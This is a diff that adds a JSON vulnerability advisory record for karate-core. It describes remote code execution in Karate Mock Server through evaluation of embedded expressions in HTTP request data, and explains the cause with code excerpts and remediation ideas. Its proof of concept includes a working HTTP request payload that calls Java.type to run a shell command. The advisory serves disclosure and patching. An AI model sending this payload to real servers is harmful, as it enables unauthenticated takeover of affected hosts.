@@ -1,0 +1,46 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-06-18T13:06:49Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.karatelabs:karate-core"
+  },
+  "Advisory": {
+    "DatabaseId": 364856,
+    "Id": "GSA_kwCzR0hTQS0yYzg1LXJmY2MtZzc0as4ABZE4",
+    "GhsaId": "GHSA-2c85-rfcc-g74j",
+    "References": [
+      {
+        "Url": "https://github.com/karatelabs/karate/security/advisories/GHSA-2c85-rfcc-g74j"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-2c85-rfcc-g74j"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-2c85-rfcc-g74j"
+      }
+    ],
+    "Description": "### Summary\n\nKarate Mock Server can execute embedded expressions found in attacker-controlled HTTP request data when a Mock Server feature assigns request-derived values such as `request`, `requestHeaders`, or `requestParams` to variables.\n\nIn affected scenarios, an unauthenticated remote attacker can place a Karate embedded expression such as `#(Java.type(...))` in the HTTP body, headers, or query parameters. The Mock Server then recursively processes that untrusted data as embedded expressions and evaluates it server-side, which can lead to arbitrary command execution under the privileges of the Karate Mock Server process.\n\nThis issue does not require the attacker to control the feature file. The vulnerable precondition is that the Mock Server feature uses request-derived data in a way that passes through Karate expression evaluation, for example:\n\n```karate\n* def body = request\n* def hdrs = requestHeaders\n* def params = requestParams\n```\n\n### Details\n\nThe issue is caused by a missing trust boundary between HTTP request-derived data and Karate feature-authored embedded expressions.\n\nIn `MockHandler`, the current HTTP request is stored and request-derived values are exposed to the Karate runtime. For example, the request body is made available through the `request` binding:\n\n```java\n// MockHandler.java\nthis.currentRequest = request;\nrequest.processBody();\n\nengine.put(\"request\", (JsLazy) () -\u003e\n    currentRequest != null ? currentRequest.getBodyConverted() : null);\n```\n\n`HttpRequest.getBodyConverted()` converts attacker-controlled JSON request bodies into Java objects such as `Map\u003cString, Object\u003e`:\n\n```java\n// HttpRequest.java\npublic Object getBodyConverted() {\n    ResourceType rt = getResourceType();\n    if (rt != null \u0026\u0026 rt.isBinary()) { return body; }\n    return HttpUtils.fromBytes(body, false, rt);\n}\n```\n\nWhen a Mock Server feature contains a step such as:\n\n```karate\n* def body = request\n```\n\nthe expression `request` is evaluated by `StepExecutor.executeDef()` through `evalKarateExpression()`:\n\n```java\n// StepExecutor.java\nObject value = evalKarateExpression(expr);\nruntime.setVariable(name, value);\n```\n\nInside `evalKarateExpression()`, the evaluated value is processed as embedded-expression content if it is a `Map` or `List`:\n\n```java\n// StepExecutor.java\nObject value = runtime.eval(wrapJsonLikeExpression(expr));\nif (value instanceof Map || value instanceof List) {\n    value = processEmbeddedExpressions(value, true);\n}\n```\n\nThis is the vulnerable trust-boundary violation. The `Map` originates from the attacker-controlled HTTP request body, but Karate recursively treats its string values as possible embedded expressions.\n\n`processEmbeddedExpressions()` recursively walks nested maps/lists and sends string values to `processEmbeddedString()`:\n\n```java\n// StepExecutor.java\n} else if (value instanceof String str) {\n    return processEmbeddedString(str, lenient);\n}\n```\n\n`processEmbeddedString()` treats strings of the form `#(...)` as embedded expressions and evaluates them:\n\n```java\n// StepExecutor.java\nif (str.startsWith(\"#(\") \u0026\u0026 str.endsWith(\")\")) {\n    String expr = str.substring(2, str.length() - 1);\n    try {\n        return runtime.eval(expr);\n```\n\nBecause the Karate runtime supports Java interop through `Java.type(...)`, attacker-controlled request data can reach Java class loading and command execution.\n\nThe same issue applies to other request-derived bindings, such as `requestHeaders` and `requestParams`, when a Mock Server feature assigns them or otherwise passes them through Karate expression evaluation.\n\nThe important point is that the attacker does not need to control the feature file. The feature author only needs to assign request-derived data such as `request`, `requestHeaders`, or `requestParams`; the framework then automatically performs embedded-expression evaluation on attacker-controlled data.\n\n\n### PoC\n\nA minimal vulnerable Mock Server feature is:\n\n```karate\nFeature: demo\n\nBackground:\n* def responseHeaders = { 'Content-Type': 'application/json' }\n\nScenario: pathMatches('/api/echo')\n* def body = request\n* def response = { ok: true }\n```\n\nStart the Mock Server with the vulnerable feature:\n\n```bash\njava -cp \"\u003ckarate-core-and-runtime-classpath\u003e\" io.karatelabs.Main mock -p 18080 -m vuln.feature\n```\nhttp body is here:\n```http\nPOST /api/echo HTTP/1.1\nHost: localhost:18080\nContent-Type: application/json\nContent-Length: 87\n\n{\"poc\": \"#(Java.type('java.lang.Runtime').getRuntime().exec('sh -c id\u003e/tmp/success'))\"}\n```\n\u003cimg width=\"1051\" height=\"558\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f12c4631-dd22-439c-a8df-c7243726c0c4\" /\u003e\n\n\nAdditional verified vectors:\n\n1. Body vector: triggered when the feature assigns `request`.\n2. Header vector: triggered when the feature assigns `requestHeaders`.\n3. Query parameter vector: triggered when the feature assigns `requestParams`.\n\nThese vectors demonstrate that the issue is not limited to a single HTTP input location. It affects request-derived data that is later passed through embedded expression processing.\n\n### Impact\n\nAn unauthenticated remote attacker can execute arbitrary operating-system commands on a server running an affected Karate Mock Server scenario.\n\nThe impact depends on whether the Mock Server is reachable by untrusted users and whether the feature file assigns request-derived data such as `request`, `requestHeaders`, or `requestParams`. In that configuration, the attacker does not need credentials, user interaction, or control over the feature file.\n\nThis can result in full compromise of the Mock Server process, including confidentiality, integrity, and availability impact for files, environment variables, network access, and credentials available to that process.\n\n### Tested versions\n\nConfirmed on:\n\n* `io.karatelabs:karate-core` v2.0.10\n* main branch commit `dff68200d`, project version `2.0.11.RC1`\n\nThe same vulnerable code path appears to exist in v2.0.1 through v2.0.9.\n\nI am not claiming v1.x as affected without independent verification.\n\n### Suggested remediation\n\nKarate should not automatically process embedded expressions inside data that originated from HTTP requests.\n\nPossible fixes include:\n\n1. Preserve a trust boundary for request-derived values such as `request`, `requestHeaders`, and `requestParams`, and skip `processEmbeddedExpressions` for those values.\n2. Add a Mock Server safe mode that disables or restricts `Java.type()` / Java interop while processing request data.\n3. Require an explicit opt-in step for evaluating embedded expressions inside request-derived data.\n4. Add regression tests for body, header, and query parameter injection where `#(Java.type(...))` must remain inert data instead of being evaluated.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-06-18T13:06:46Z",
+    "Severity": "HIGH",
+    "Summary": "Karate Mock Server RCE via embedded expression evaluation of request-derived data",
+    "UpdatedAt": "2026-06-18T13:06:49Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.1.0"
+      },
+      "VulnerableVersionRange": "\u003e= 2.0.1, \u003c= 2.0.10"
+    }
+  ]
+}
